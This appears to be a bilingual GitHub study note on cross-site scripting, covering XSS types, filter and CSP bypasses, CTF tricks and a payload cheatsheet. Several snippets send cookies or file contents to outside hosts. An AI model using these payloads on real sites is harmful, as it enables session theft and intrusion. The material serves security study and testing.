# Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
1. reflected xss:  
`<?php echo 'xss, '.$_GET['script']; ?>`

2. stored xss:  
Forum or mail board, insert script into the content.  
`<?php echo 'xss, '.$DB_value; ?>`

3. DOM xss: 最近の流行り  
DOM XSS is different from reflected xss and stored xss. It based on **source** and **sink** which we can run dynamically on the client side.  

Here are three kinds of common sinks:  
1. document sink  
```js
// get_var = <img src=x onerror=alert(1)>
document.getElementById('id').innerHTML = get_var;
```  
It is important that `<script>alert(1)</script>` doesn't work here because the operation is just a DOM injection.  

2. location sink  
```js
// url = javascript:alert(1)
document.location = url;
```  

3. execution sink  
e.g. `eval`, `setInterval`, `setTimeout`  

Attention: Only reflective stored would interact with server because server needs to parse malicious script, but DOM is completely run in client side.  

*  [XSS detection](#xss-detection)  
*  [Bypass tricks](#bypass-tricks)  
*  [htmlspecialchars bypass](#htmlspecialchars-bypass)
*  [XSS-Auditor Introduction and bypass](#xss-auditor-intro-and-bypass)  
*  [CSP Introduction and bypass](#csp-intro-and-bypass)  
*  [Regular expression](#regular-expression)  
*  [Some tricks played in CTF](#some-tricks-played-in-ctf)  
*  [pop up](#pop-up)  
*  [Cheatsheet](#cheatsheet)    
*  [An interesting feature related to Transfer-Encoding](#an-interesting-feature-related-to-transfer-encoding)  
*  [Reference](#reference)

# XSS detection
I am used to injecting script directly for test, test like following:  
```js
<script>alert(/1/);<script>
<a href=1 onload=alert(1)>hi</a>
```  

# Bypass tricks
* Obfuscation  
* toUpperCase()  
```js
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k
```
* Only one time filter  
```php
str_replace('<script>','',$GET['hi'])  // it means script in content will become space
// <scr<script>ipt>
```  
* filter with regex  
```php
preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])
// <img src=1 onerror=alert(1)>
```
* encode (parse the dangerous char  
  * url encode: `% + ASCII(hex) %3Cscript%3E`  
  * http://www.jsfuck.com/  
  js func: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
  * html encode
  ```php
  htmlspecialchars($_GET['hi']);  // no open html tag for you
  ```  
  * unicode encode: %u + ASCII(hex) ASP,IIS will automatically parse unicode. `<%s%cr%u0131pt>`  
  * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx](https://github.com/shinmao/Web-Security-Learning/blob/master/SQL-inj/README.md#bypass-requestvalidation-on-aspx)  
  * ascii encode
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  [Encode_tool](http://monyer.com/demo/monyerjs/)  
  String.fromCharCode() converts unicode to string [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() run the js script [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  import js from outside  
* Byass with line feed`\n`  
```js
<img src="javas
cript:
alert(/1/);">
```
* XSS filters  
* WAF  
* HTML Sanitizer  
* URL bypass `.`, `//`  
  RWCTF2018: `<?=ip2long("my-ip")` bypass dot，`\\` bypass `http://`  
  Sup: the first `/` is used to separate schema and path, the second `/` is part of path  
* CSP(Content-Security-Policy)  
  The content of CSP is in following :sweat:  

# htmlspecialchars bypass  
php nature function, can convert `&`,`'`,`"`,`<`,`>` five kinds of char to string. It won't filter out the single quote if it doesn't have the second parameter(`ENT_QUOTES`).  
1. `htmlspecialchars($input)` in `value`:  
```php
<input value="<" onclick=alert(1)>
```  
special chars are converted to pure string and close the `value` attribute  
2. If you can control the content encoding type, you can try such as UTF-7

# XSS Auditor Intro and bypass
XSS Auditor is specific defense toward **Reflected XSS** on Chrome. -- [XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
Here I will talk about the XSS filter in three browsers：  
1. IE XSS filter: replace dangerous character in request or response with regex  
2. Chrome XSS Auditor: check dangerous character in requst or response,**filter it only when it dangerous after putting into the page**.  
3. Firefox Noscript: Only check the dangerous character in request
```
// disable
X-XSS-Protection: 0

// Only filter the dangerous part
X-XSS-Protection: 1

// block the response and redirect to about:blank
X-XSS-Protection: 1; mode=block

// redirect report to the place you want
X-XSS-Protection: 1; mode=block; report=https://example.com/log.cgi
X-XSS-Protection: 1; report="https://example.com/log.cgi?jsessionid=132;abc"
```

Auditor reference:  
* Source code  
[xss_auditor.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor.h)  
[xss_auditor_delegate.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor_delegate.h)

# CSP Intro and bypass
Defense from browser side -- [Content Security Policy Level 3](https://www.w3.org/TR/CSP/)  
With two ways 1. limit `js` to execute 2. limit request to other domains  
How to see whether there is a CSP working on the website？  
```php
curl -I https://github.com/
// list header
// From results, we can see that github already open the option of XSS-Protection
// also can see the details of CSP
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
```
Now we focus on the CSP  
```php
header("Content-Security-Policy: default-src 'self '; script-src * ");
```
The CSP above welcome you to load js from any domain :-1: , and stop from loading any source from other domains
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```
The CSP above only let you load the js from same domain, such as `src=upload/1pwnch.js`
```php
header(" Content-Security-Policy: default-src 'self '; script-src http://localhost/static/ ");
Content-Security-Policy: script-src 'self' trusted.domain.com
```
First CSP: we can only load js from static path. In this case, we can find any redirect file under the path of `static/`, control it and redirect to the js file we want.  
Second CSP: We can find controllable script from trusted.domain.com, or any **jsonp** to exploit it, for example：  
```php
<script src="trusted.domain.com/jsonp?callback=alert(1)//"></script>
```
In addition to jsonp, `Angularjs` also can be used to bypass the CSP. Therefore, we need `strict-dynamic`.  
Let's take a look at more CSP  
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
```
`unsafe-inline` means the added `<script>` in the page can execute, then we can bypass the limit of domain with following ways：  
  1. make link prefetch with js  
     [what's prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
     prefetch: `DNS-prefetch`,`subresource`,`prefetch`,`preconnect`,`prerender`  
     Not all source can be preloaded, e.g. ajax, open your page of developer tool    
     ```js
     // can only be used by chrome  
     var x = document.createElement("link");
     x.setAttribute("rel", "prefetch");
     x.setAttribute("href", "//xxxxx.com/?" + document.cookie);
     document.head.appendChild(x);
     ```
  2. redirect && cross domain  
     跳轉的部分注意跳板也受host的限制，src路徑則跳脫限制  
     ```js
     <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
     <script>windows.open('http://lorexxar.cn?a=+document.cooke')</script>
     <meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
     //
     var x = document.createElement("x");
     x.href='http://xss.com/?cookie='+escape(document.cookie);
     x.click();
     ```  
* nonce script CSP  
  這是在CSP2出現的概念，Web應用會根據一個隨機token來判斷腳本是否可信任  
  ```php
  header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{隨機}' ");
  ```
  以上CSP只有帶一樣nonce`<script nonce="{隨機}">alert(1)</script>`的script才可以執行  
  但是要**繞過**也很簡單，這個`隨機`字符串基本上是每次request都會重新產生(一次性)  
  ```php
  // 假設header裡面是類似 nonce-".$random." 在後端產生
  <script nonce="<?php echo $random ?>">
  ```  
  **Sebastian Lekies** 提出**DOM XSS**可以完虐nonce script CSP  
  [How to bypass CSP nonces with DOM XSS 🎅](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
  諸如`location.hash`操作的xss攻擊，根本不需要經過後台，那nonce的值也不會刷新  
* strict-dynamic  
  這是在CSP3中新規範的一種參數，為了現代各式各樣的框架而提出  
  ```js
  script-src 'nonce-random' 'strict-dynamic'; object-src 'none'
  // 以下為masakato對strict-dynamic的解釋
  // 可加載
  <script src='test.com/a.js' nonce='random'></script>
  ```
  這樣一行CSP就可以確保所有**靜態**的`script`有匹配的nonce，strict-dynamic可以幫助開發人員在web運行過程中動態加載受信任的腳本  
  如果`a.js`想要加載其他的js，只有**非parser-inserted**的script可以被允許執行  
  ```js
  <!-- a.js -->
  // 可加載
  var script = document.createElement('script');
  script.src = 'test.com/dependency.js';
  document.body.appendChild(script);
  // 不可
  document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
  ```
  `createElement`時，element還屬於非parser-inserted屬性的，使用`documemt.write`的話就是parser-inserted屬性的了  

  :cat2:**Script Gadgets**：  
  [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
  Script Gadget是指一些已存在的js code用來bypass xss mitigations  
  ```js
  // bypass with require.js
  Content-Security-Policy: "default-src='none';script-src 'nonce-random' 'strict-dynamic'"
  <script data-main="data:,alert(1)"></script>
  <script nonce="random" src="require.js"></script>
  // 原因：require.js在找到帶有data-main屬性的script時，會如下載入
  var node = document.createElement('script');
  node.src = 'data:,alert(1)';
  document.head.appendChild(node);
  // 如上面提到的，非parser-inserted
  ```

  :cat2:**CVE-2018-5175** (利用**add-on**繞過strict-dynamic)：  
  [首先extension和add-on都是些什麼東西？](https://developer.mozilla.org/zh-TW/Add-ons/WebExtensions)  
  legacy-extension就是那些過去以XUL/XPCOM為基礎所建造的擴充，雖然2017/11後基礎已改為Web-extensions，但瀏覽器內部至今還多使用這個機制  
  這裡我們必須了解`manifest`下的`web_accessible_resources`(webextension)以及`contentaccessible flag`(legacy extension)，被這個`url contentaccessible=yes`的resource可以從任何頁面載入，這裡就有個弊端了，**任何頁面載入並且不需要nonce允許**！  
  ```json
  ....
  resource devtools devtools/modules/devtools/
  resource devtools-client-jsonview resouce://devtools/client/jsonview/ contentaccessible=yes
  ....
  ```
  上面是firefox extension下`manifest`的一部分，可以知道`resource://devtools`下面的file都可以從任何頁面載入而不需要nonce的允許，而`resource://devtools/client/jsonview/lib/require.js`也不例外。  
  ```js
  <!-- exploit -->
  csp: strict-dynamic...

  <script data-main="data:,alert(1)"></script>
  <script src="resource://devtools-client-jsonview/lib/require.js"></script>
  ```
  所以我們不需要nonce也能讓`require.js`載入執行，靠script-gadget中提到`require.js`尋找`data-main`屬性，不難理解這個xss的攻擊就會成功bypass csp了！  

  若不是框架中帶有的script-gadget，就從開發者的code中自己找一個，以下為思路：  
  某段script中將`attribute`的值插入`innerHTML`;  

以web開發人員的角度推薦幾個工具：  
1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  

以上筆記很大部分取自  
[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
[CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
非常推薦閱讀原文  
[迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)


# Regular expression
js中會用正規表達式來過濾危險字符  
```js
/g -> 全局匹配
/i -> case insensitive
```
參考如下文件：  
[Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)

# Some tricks played in CTF  
Here are something what I learned in sites or CTF.  
* Exploit with various `<tag>`  
```js
// script
<script>a=prompt;a(1)</script>

// img
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">

// svg
<svg/onload=alert(1)>

// body
// 這種payload也可以繞過括號過濾
<body/onload=javascript:window.onerror=eval;throw=alert\x281\x29’;>  
```
* DOM based XSS  
```js
<script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
// #之後的內容不會被傳送到server端
```
* bootstrap data-* 屬性  
```js
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<button data-toggle="collapse" data-target="<img src=x onerror=alert(0)>">Test</button>

// 關於這個漏洞的解釋issue中有一個評論很清楚
<button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
// 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
```
值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
[XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
* Vue.js  
with SSTI  
* `<base>` overwrites the js in relative path  
This is what I learned in RCTF-2018, CSP doesn't limit `base-uri` cause to `<base>` bypass, and there are also relative js imported from outside, now we can forge a js which is able to ignore the CSP rules.  
**Exploit**:  
:point_down: insert `<base href="http://controlled_domain/">`  
:point_down: imported `/assets/jquery.min.js` becomes `http://controlled_domain/assets/jquery.min.js`  
:point_down: `controlled_domain/assets/jquery.min.js` can be inserted with `location.href=url;`  
:point_down: when we visit the page inserted with `<base>`, we will be redirect to `url`!  
More details: [rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)  
* `<base target>` steal the content of pages(token)  
Also use the tag of `<base>` but the concept is different  
**Exploit**:  
:point_down: insert an uncompleted `<base target>` to the page  
:point_down: `target` makes all URL's page[http://evil.com/](http://evil.com/)in current page have a same `window.name`!  
:point_down: page of [http://evil.com/](http://evil.com/) has `<script>alert(name);</script>`  
:point_down: the content of pop block is the name of the target  
[reference](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  

# pop up
Currently most of the browsers have stop from poping up window  
@MasatoKinugawa find a trick to bypass:  
```js
<script>
onkeydown=function(){
    window.open('//example.com/','_blank','a');
}
onkeypress=function(){
    window.open('about:blank','_blank').close();
}
```
https://vulnerabledoma.in/popunder/keyevent.html  
[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)  

# Cheatsheet
```php
</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
"><script>al\u0065rt(document.domain)</script>
"><script>al\u{65}rt(document.domain)</script>
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>

// document.write take multiple arguments
document.write("<s","crip","t>al","ert(","1)","</s","cript>")

// Unicode-based
location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'

// redirection
atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()  

// Use xss to read file
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://kaibro.tw/log.php?c='+btoa(xmlhttp.responseText);
        }
}
xmlhttp.open("GET","abc.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///etc/passwd");
```  
[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  

# An interesting feature related to Transfer-Encoding
If POST request includeds header of `Transfer-Encoding: chunked`, the data stream would be responded to client without any changes. This causes to the malicious content such like XSS.(Has been patched in the lastest version)  
[XSS due to the header Transfer-Encoding: chunked](https://bugs.php.net/bug.php?id=76582)

# Reference
1. The Web Application Hacker's Handbook  
2. [看雪](https://www.kanxue.com)  
3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
8. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
9. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)  
10. [CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
